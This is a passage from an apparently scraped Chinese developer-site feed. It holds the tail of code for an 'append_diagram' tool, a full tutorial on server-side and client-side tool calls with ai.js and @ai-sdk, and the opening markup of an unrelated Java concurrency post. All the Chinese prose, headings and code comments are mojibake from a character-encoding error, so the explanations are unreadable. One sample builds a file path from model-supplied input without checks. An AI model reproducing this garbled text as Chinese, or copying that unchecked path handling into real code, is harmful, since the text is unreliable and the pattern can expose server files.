Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`ERROR: You started fresh with wrapper tags. Do NOT include wrapper tags or root cells (id="0", id="1").
Continue from EXACTLY where the partial ended:
\`\`\`
<span class="hljs-subst">${partialXmlRef.current.slice(-<span class="hljs-number">500</span>)}</span>
\`\`\`
Start your continuation with the NEXT character after where it stopped.`</span>,
Â  Â  Â  Â  })
Â  Â  Â  Â  <span class="hljs-keyword">return</span>
Â  Â  }


Â  Â  <span class="hljs-comment">// æ‹¼æ¥</span>
Â  Â  partialXmlRef.<span class="hljs-property">current</span> += xml
Â  Â  <span class="hljs-comment">// å®Œæ•´æ€§æ£€éªŒ</span>
Â  Â  <span class="hljs-keyword">const</span> isComplete = <span class="hljs-title function_">isMxCellXmlComplete</span>(partialXmlRef.<span class="hljs-property">current</span>)
Â  Â 
Â  Â  <span class="hljs-keyword">if</span> (isComplete) {
Â  Â  Â  Â  <span class="hljs-keyword">const</span> finalXml = partialXmlRef.<span class="hljs-property">current</span>
Â  Â  Â  Â  partialXmlRef.<span class="hljs-property">current</span> = <span class="hljs-string">""</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> fullXml = <span class="hljs-title function_">wrapWithMxFile</span>(finalXml)
Â  Â  Â  Â  
Â  Â  Â  Â  <span class="hljs-comment">// æ¸²æŸ“æ ¡éªŒ</span>
Â  Â  Â  Â  <span class="hljs-keyword">const</span> validationError = <span class="hljs-title function_">onDisplayChart</span>(fullXml)
Â  Â  Â  Â  <span class="hljs-keyword">if</span> (validationError) {
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`Validation error after assembly: <span class="hljs-subst">${validationError}</span>
Assembled XML:
\`\`\`xml
<span class="hljs-subst">${finalXml.substring(<span class="hljs-number">0</span>, <span class="hljs-number">2000</span>)}</span>...
\`\`\`
Please use display_diagram with corrected XML.`</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-attr">output</span>: <span class="hljs-string">"Diagram assembly complete and displayed successfully."</span>,
Â  Â  Â  Â  Â  Â  })
Â  Â  Â  Â  }
Â  Â  } <span class="hljs-keyword">else</span> {
Â  Â  Â  Â  <span class="hljs-comment">// ä»ç„¶ä¸å®Œæ•´ï¼Œæç¤ºç»§ç»­è¡¥å……</span>
Â  Â  Â  Â  <span class="hljs-title function_">addToolOutput</span>({
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">tool</span>: <span class="hljs-string">"append_diagram"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">toolCallId</span>: toolCall.<span class="hljs-property">toolCallId</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">state</span>: <span class="hljs-string">"output-error"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">errorText</span>: <span class="hljs-string">`XML still incomplete (mxCell not closed). Call append_diagram again to continue.
Current ending:
\`\`\`
<span class="hljs-subst">${partialXmlRef.current.slice(-<span class="hljs-number">500</span>)}</span>
\`\`\`
Continue from EXACTLY where you stopped.`</span>,
Â  Â  Â  Â  })
Â  Â  }
}

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é€šè¿‡`ai.js`ä¸`@ai-sdk`å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’]]></title>    <link>https://juejin.cn/post/7592159803411562532</link>    <guid>https://juejin.cn/post/7592159803411562532</guid>    <pubDate>2026-01-07T18:22:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592159803411562532" data-draft-id="7592452108797640747" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é€šè¿‡`ai.js`ä¸`@ai-sdk`å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,LLM"/> <meta itemprop="datePublished" content="2026-01-07T18:22:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="irises"/> <meta itemprop="url" content="https://juejin.cn/user/3030697436261735"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é€šè¿‡`ai.js`ä¸`@ai-sdk`å®ç°å‰åç«¯toolæ³¨å…¥ä¸äº¤äº’
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3030697436261735/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    irises
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T18:22:16.000Z" title="Wed Jan 07 2026 18:22:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ç¤ºä¾‹ä»£ç æ‘˜å–è‡ªå¼€æºé¡¹ç›®ï¼šnext-ai-draw-io</p>
</blockquote>
<h3 data-id="heading-0">1. æ€»è¿°</h3>
<p>åœ¨ <code>ai.js</code> ä¸­ï¼Œå·¥å…·ï¼ˆToolsï¼‰é€šè¿‡ <code>streamText</code> é…ç½®çš„ <code>tools</code> å‚æ•°æ³¨å…¥ï¼Œåˆ†ä¸ºä¸¤ç±»ï¼š</p>
<ul>
<li><strong>æœåŠ¡ç«¯å·¥å…·</strong>ï¼šé…ç½®åŒ…å« <code>execute</code> å¼‚æ­¥å‡½æ•°ï¼Œå¯åœ¨æœåŠ¡ç«¯è‡ªåŠ¨æ‰§è¡Œå¹¶è¿”å›ç»“æœï¼›</li>
<li><strong>å®¢æˆ·ç«¯å·¥å…·</strong>ï¼šä»…é…ç½®å…ƒä¿¡æ¯ï¼ˆ<code>description</code>/<code>inputSchema</code>ï¼‰ï¼Œæ—  <code>execute</code> å‡½æ•°ï¼Œéœ€å‰ç«¯æ‰§è¡Œåæ‰‹åŠ¨å›ä¼ ç»“æœã€‚</li>
</ul>
<h3 data-id="heading-1">2. å·¥å…·æ³¨å…¥ï¼ˆstreamText æ ¸å¿ƒé…ç½®ï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœåŠ¡ç«¯ streamText è°ƒç”¨ï¼ˆæ ¸å¿ƒä»£ç ï¼‰</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">streamText</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-title function_">openai</span>(<span class="hljs-string">'gpt-4o'</span>),
  <span class="hljs-attr">messages</span>: allMessages, <span class="hljs-comment">// å¯¹è¯å†å²</span>
  <span class="hljs-comment">// æ³¨å…¥å·¥å…·</span>
  <span class="hljs-attr">tools</span>: {
    <span class="hljs-comment">// 1. æœåŠ¡ç«¯å·¥å…·ï¼šå¸¦ execute å‡½æ•°</span>
    <span class="hljs-attr">get_shape_library</span>: {
      <span class="hljs-attr">description</span>: <span class="hljs-string">"è·å–draw.ioå½¢çŠ¶åº“æ–‡æ¡£"</span>, <span class="hljs-comment">// æ¨¡å‹è¯†åˆ«å·¥å…·çš„æè¿°</span>
      <span class="hljs-attr">inputSchema</span>: z.<span class="hljs-title function_">object</span>({ <span class="hljs-comment">// å…¥å‚æ ¡éªŒSchemaï¼ˆzodï¼‰</span>
        <span class="hljs-attr">library</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"å½¢çŠ¶åº“åç§°ï¼Œå¦‚aws4"</span>)
      }),
      <span class="hljs-comment">// æœåŠ¡ç«¯è‡ªåŠ¨æ‰§è¡Œçš„å‡½æ•°ï¼Œè¿”å›å€¼ç›´æ¥ä¼ ç»™æ¨¡å‹</span>
      <span class="hljs-attr">execute</span>: <span class="hljs-keyword">async</span> ({ library }) =&gt; {
        <span class="hljs-comment">// æœåŠ¡ç«¯ä¸šåŠ¡é€»è¾‘ï¼ˆæ–‡ä»¶è¯»å–/APIè°ƒç”¨ç­‰ï¼‰</span>
        <span class="hljs-keyword">const</span> content = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">`./docs/<span class="hljs-subst">${library}</span>.md`</span>, <span class="hljs-string">'utf-8'</span>);
        <span class="hljs-keyword">return</span> content; <span class="hljs-comment">// ç»“æœè‡ªåŠ¨è¿”å›ç»™æ¨¡å‹ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†</span>
      }
    },
    <span class="hljs-comment">// 2. å®¢æˆ·ç«¯å·¥å…·ï¼šä»…å…ƒä¿¡æ¯ï¼Œæ—  execute</span>
    <span class="hljs-attr">display_diagram</span>: {
      <span class="hljs-attr">description</span>: <span class="hljs-string">"åœ¨draw.ioæ¸²æŸ“å›¾å½¢ï¼ˆå®¢æˆ·ç«¯æ‰§è¡Œï¼‰"</span>,
      <span class="hljs-attr">inputSchema</span>: z.<span class="hljs-title function_">object</span>({
        <span class="hljs-attr">xml</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"draw.ioçš„mxCell XMLå­—ç¬¦ä¸²"</span>)
      })
      <span class="hljs-comment">// æ—  execute å‡½æ•°ï¼Œéœ€å‰ç«¯å¤„ç†</span>
    }
  },
  <span class="hljs-attr">experimental_repairToolCall</span>: <span class="hljs-keyword">async</span> ({ toolCall, error }) =&gt; {
    <span class="hljs-comment">// ä¿®å¤æ¨¡å‹è¿”å›çš„å·¥å…·å…¥å‚æ ¼å¼é”™è¯¯ï¼ˆå¦‚æˆªæ–­çš„JSONï¼‰</span>
    <span class="hljs-keyword">if</span> (error.<span class="hljs-property">name</span> === <span class="hljs-string">'InvalidToolInputError'</span>) {
      <span class="hljs-keyword">return</span> { ...toolCall, <span class="hljs-attr">input</span>: <span class="hljs-title function_">jsonrepair</span>(toolCall.<span class="hljs-property">input</span>) };
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  },
  <span class="hljs-attr">onFinish</span>: <span class="hljs-function">(<span class="hljs-params">{ totalUsage }</span>) =&gt;</span> {
    <span class="hljs-comment">// å¯¹è¯ç»“æŸå›è°ƒï¼ˆè®°å½•token/æ—¥å¿—ï¼‰</span>
  }
});

<span class="hljs-comment">// è½¬æ¢ä¸ºå‰ç«¯å¯è¯†åˆ«çš„æµå¼å“åº”</span>
<span class="hljs-keyword">return</span> result.<span class="hljs-title function_">toUIMessageStreamResponse</span>({
  <span class="hljs-attr">sendReasoning</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// è¿”å›æ¨¡å‹æ¨ç†è¿‡ç¨‹</span>
});
</code></pre>
<p><strong>æ³¨è§£</strong>ï¼š</p>
<ul>
<li><code>tools</code> å¯¹è±¡ä¸­ï¼Œæ¯ä¸ªé”®ä¸ºå·¥å…·åç§°ï¼Œå€¼ä¸ºå·¥å…·é…ç½®ï¼›</li>
<li><code>inputSchema</code>ï¼ˆzod æ ¼å¼ï¼‰ç”¨äºæ ¡éªŒæ¨¡å‹ä¼ å…¥çš„å·¥å…·å‚æ•°ï¼›</li>
<li><code>toUIMessageStreamResponse</code> æ˜¯æœåŠ¡ç«¯ä¸å‰ç«¯ <code>useChat</code> é€šä¿¡çš„å…³é”®ï¼Œæ ¼å¼åŒ–æµå¼å“åº”ä¸ºå‰ç«¯å¯è§£æçš„ç»“æ„ï¼ˆåŒ…å« <code>toolCall</code>/<code>text</code> ç­‰å­—æ®µï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-2">3. å‰ç«¯å·¥å…·äº¤äº’ï¼ˆuseChat æ ¸å¿ƒé…ç½®ï¼‰</h3>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// å‰ç«¯ useChat è°ƒç”¨</span>
<span class="hljs-keyword">const</span> { messages, sendMessage, addToolOutput } = <span class="hljs-title function_">useChat</span>({
  <span class="hljs-comment">// é…ç½®ä¼ è¾“å±‚ï¼Œå¯¹æ¥æœåŠ¡ç«¯ /api/chat æ¥å£</span>
  <span class="hljs-attr">transport</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultChatTransport</span>({
    <span class="hljs-attr">api</span>: <span class="hljs-string">'/api/chat'</span>,
  }),
  <span class="hljs-comment">// æ¨¡å‹è§¦å‘å·¥å…·è°ƒç”¨æ—¶çš„å›è°ƒ</span>
  <span class="hljs-attr">onToolCall</span>: <span class="hljs-keyword">async</span> ({ toolCall }) =&gt; {
    <span class="hljs-keyword">const</span> { <span class="hljs-attr">id</span>: toolCallId, toolName, <span class="hljs-attr">input</span>: toolInput } = toolCall;
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// åŒºåˆ†å·¥å…·ç±»å‹å¤„ç†</span>
      <span class="hljs-keyword">switch</span> (toolName) {
        <span class="hljs-comment">// å®¢æˆ·ç«¯å·¥å…·ï¼šå‰ç«¯æ‰§è¡Œé€»è¾‘ + æ‰‹åŠ¨å›ä¼ ç»“æœ</span>
        <span class="hljs-keyword">case</span> <span class="hljs-string">'display_diagram'</span>: {
          <span class="hljs-keyword">const</span> { xml } = toolInput <span class="hljs-keyword">as</span> { <span class="hljs-attr">xml</span>: <span class="hljs-built_in">string</span> };
          <span class="hljs-comment">// å‰ç«¯ä¸šåŠ¡é€»è¾‘ï¼ˆå¦‚è°ƒç”¨draw.io APIæ¸²æŸ“å›¾å½¢ï¼‰</span>
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">renderDiagram</span>(xml);
          
          <span class="hljs-comment">// æ‰‹åŠ¨å›ä¼ ç»“æœç»™æ¨¡å‹</span>
          <span class="hljs-title function_">addToolOutput</span>({
            <span class="hljs-attr">toolCallId</span>: toolCallId, <span class="hljs-comment">// å¿…é¡»åŒ¹é…æ¨¡å‹è¿”å›çš„IDï¼ˆå…³é”®ï¼‰</span>
            <span class="hljs-attr">toolName</span>: toolName,
            <span class="hljs-attr">output</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-comment">// ç»“æœéœ€åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²</span>
              <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>,
              <span class="hljs-attr">message</span>: <span class="hljs-string">'å›¾å½¢æ¸²æŸ“æˆåŠŸ'</span>
            })
          });
          <span class="hljs-keyword">break</span>;
        }
        <span class="hljs-comment">// æœåŠ¡ç«¯å·¥å…·ï¼šå‰ç«¯æ— éœ€å¤„ç†ï¼Œç­‰å¾…æœåŠ¡ç«¯è‡ªåŠ¨æ‰§è¡Œ</span>
        <span class="hljs-keyword">case</span> <span class="hljs-string">'get_shape_library'</span>: {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç­‰å¾…æœåŠ¡ç«¯è¿”å›å½¢çŠ¶åº“ç»“æœ'</span>);
          <span class="hljs-keyword">break</span>;
        }
        <span class="hljs-attr">default</span>:
          <span class="hljs-comment">// æœªçŸ¥å·¥å…·è¿”å›é”™è¯¯</span>
          <span class="hljs-title function_">addToolOutput</span>({
            toolCallId,
            toolName,
            <span class="hljs-attr">output</span>: <span class="hljs-string">''</span>,
            <span class="hljs-attr">error</span>: <span class="hljs-string">`æœªçŸ¥å·¥å…·ï¼š<span class="hljs-subst">${toolName}</span>`</span>
          });
      }
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// å·¥å…·æ‰§è¡Œå¤±è´¥ï¼Œå›ä¼ é”™è¯¯ä¿¡æ¯</span>
      <span class="hljs-title function_">addToolOutput</span>({
        toolCallId,
        toolName,
        <span class="hljs-attr">output</span>: <span class="hljs-string">''</span>,
        <span class="hljs-attr">error</span>: (error <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>).<span class="hljs-property">message</span>
      });
    }
  },
  <span class="hljs-comment">// å·¥å…·ç»“æœå›ä¼ åè‡ªåŠ¨è§¦å‘æ¨¡å‹ç»§ç»­å›å¤</span>
  <span class="hljs-attr">sendAutomaticallyWhen</span>: <span class="hljs-function">(<span class="hljs-params">{ messages }</span>) =&gt;</span> <span class="hljs-literal">true</span>,
  <span class="hljs-attr">onError</span>: <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'èŠå¤©é”™è¯¯ï¼š'</span>, error)
});
</code></pre>
<p><strong>æ³¨è§£</strong>ï¼š</p>
<ul>
<li><code>DefaultChatTransport</code>ï¼šå°è£…å‰ç«¯ä¸æœåŠ¡ç«¯çš„é€šä¿¡é€»è¾‘ï¼Œè‡ªåŠ¨è§£ææœåŠ¡ç«¯è¿”å›çš„æµå¼å“åº”ï¼›</li>
<li><code>onToolCall</code>ï¼šå‰ç«¯æ•è·æ¨¡å‹å·¥å…·è°ƒç”¨æŒ‡ä»¤çš„å”¯ä¸€å…¥å£ï¼›</li>
<li><code>addToolOutput</code>ï¼šå®¢æˆ·ç«¯å·¥å…·ç»“æœå›ä¼ çš„æ ¸å¿ƒæ–¹æ³•ï¼Œ<code>toolCallId</code> å¿…é¡»ä¸æ¨¡å‹è¿”å›çš„ ID ä¸€è‡´ï¼ˆå¦åˆ™æ¨¡å‹æ— æ³•å…³è”ç»“æœï¼‰ï¼›</li>
<li><code>sendAutomaticallyWhen: () =&gt; true</code>ï¼šç¡®ä¿å·¥å…·ç»“æœå›ä¼ åï¼Œæ¨¡å‹è‡ªåŠ¨ç”Ÿæˆæœ€ç»ˆå›å¤ï¼Œå®Œæˆé—­ç¯ã€‚</li>
</ul>
<h2 data-id="heading-3">äºŒã€æœåŠ¡ç«¯å·¥å…· vs å®¢æˆ·ç«¯å·¥å…·ï¼šäº¤äº’æ ¸å¿ƒåŒºåˆ«</h2>













































<table><thead><tr><th>ç»´åº¦</th><th>æœåŠ¡ç«¯å·¥å…·ï¼ˆå¸¦ executeï¼‰</th><th>å®¢æˆ·ç«¯å·¥å…·ï¼ˆæ—  executeï¼‰</th></tr></thead><tbody><tr><td><strong>æ‰§è¡Œä¸»ä½“</strong></td><td>æœåŠ¡ç«¯ï¼ˆNode.jsï¼‰</td><td>å‰ç«¯ï¼ˆæµè§ˆå™¨ / å®¢æˆ·ç«¯ï¼‰</td></tr><tr><td><strong>æ ¸å¿ƒè§¦å‘é€»è¾‘</strong></td><td>AI.js è‡ªåŠ¨è§¦å‘ <code>execute</code> å‡½æ•°</td><td>å‰ç«¯ <code>onToolCall</code> å›è°ƒæ‰‹åŠ¨è§¦å‘</td></tr><tr><td><strong>ç»“æœè¿”å›æ–¹å¼</strong></td><td><code>execute</code> è¿”å›å€¼ç”± AI.js è‡ªåŠ¨å°è£…å¹¶ä¼ ç»™æ¨¡å‹</td><td>å‰ç«¯è°ƒç”¨ <code>addToolOutput</code> æ‰‹åŠ¨å›ä¼ ç»“æœ</td></tr><tr><td><strong>å…³é”®ä¾èµ–</strong></td><td>æœåŠ¡ç«¯ç¯å¢ƒï¼ˆæ–‡ä»¶ / æ•°æ®åº“ / åç«¯ APIï¼‰</td><td>å‰ç«¯ç¯å¢ƒï¼ˆDOM / å®¢æˆ·ç«¯ SDK / æœ¬åœ°å­˜å‚¨ï¼‰</td></tr><tr><td><strong>é€šä¿¡æˆæœ¬</strong></td><td>æ— é¢å¤–ç½‘ç»œè¯·æ±‚ï¼ˆæœåŠ¡ç«¯å†…éƒ¨å®Œæˆï¼‰</td><td>éœ€ 2 æ¬¡ç½‘ç»œè¯·æ±‚ï¼ˆæŒ‡ä»¤ä¸‹å‘ + ç»“æœå›ä¼ ï¼‰</td></tr><tr><td><strong>æ ¸å¿ƒçº¦æŸ</strong></td><td><code>execute</code> éœ€è‡ªè¡Œæ•è·å¼‚å¸¸ï¼Œè¿”å›å‹å¥½æç¤º</td><td><code>toolCallId</code> å¿…é¡»ä¸æ¨¡å‹è¿”å›çš„ ID ä¸¥æ ¼åŒ¹é…</td></tr><tr><td><strong>å…¸å‹åœºæ™¯</strong></td><td>æ•°æ®æŸ¥è¯¢ã€æ–‡ä»¶è¯»å–ã€åç«¯ API è°ƒç”¨</td><td>å‰ç«¯ UI äº¤äº’ã€æœ¬åœ°æ“ä½œã€å®¢æˆ·ç«¯ SDK è°ƒç”¨</td></tr></tbody></table>
<h2 data-id="heading-4">ä¸‰ã€æ ¸å¿ƒæµç¨‹æ¢³ç†</h2>
<h3 data-id="heading-5">1. æœåŠ¡ç«¯å·¥å…·æµç¨‹</h3>
<p>ç”¨æˆ·æŒ‡ä»¤ â†’ æœåŠ¡ç«¯ <code>streamText</code> â†’ æ¨¡å‹è°ƒç”¨æœåŠ¡ç«¯å·¥å…· â†’ AI.js è‡ªåŠ¨æ‰§è¡Œ <code>execute</code> â†’ ç»“æœè‡ªåŠ¨ä¼ ç»™æ¨¡å‹ â†’ æ¨¡å‹ç”Ÿæˆå›å¤ â†’ å‰ç«¯å±•ç¤ºã€‚</p>
<h3 data-id="heading-6">2. å®¢æˆ·ç«¯å·¥å…·æµç¨‹</h3>
<p>ç”¨æˆ·æŒ‡ä»¤ â†’ æœåŠ¡ç«¯ <code>streamText</code> â†’ æ¨¡å‹è°ƒç”¨å®¢æˆ·ç«¯å·¥å…· â†’ æœåŠ¡ç«¯é€šè¿‡æµå¼å“åº”ä¸‹å‘ <code>toolCall</code> æŒ‡ä»¤ â†’ å‰ç«¯ <code>onToolCall</code> è§¦å‘ â†’ æ‰§è¡Œå®¢æˆ·ç«¯é€»è¾‘ â†’ <code>addToolOutput</code> å›ä¼ ç»“æœ â†’ æœåŠ¡ç«¯å°è£…ç»“æœå–‚ç»™æ¨¡å‹ â†’ æ¨¡å‹ç”Ÿæˆå›å¤ â†’ å‰ç«¯å±•ç¤ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaå¹¶å‘ç¼–ç¨‹åŸºç¡€ä¸è¿›é˜¶ï¼ˆçº¿ç¨‹Â·é”Â·åŸå­ç±»Â·é€šä¿¡ï¼‰]]></title>    <link>https://juejin.cn/post/7592410399918161961</link>    <guid>https://juejin.cn/post/7592410399918161961</guid>    <pubDate>2026-01-08T02:09:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592410399918161961" data-draft-id="7592134330313408555" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" 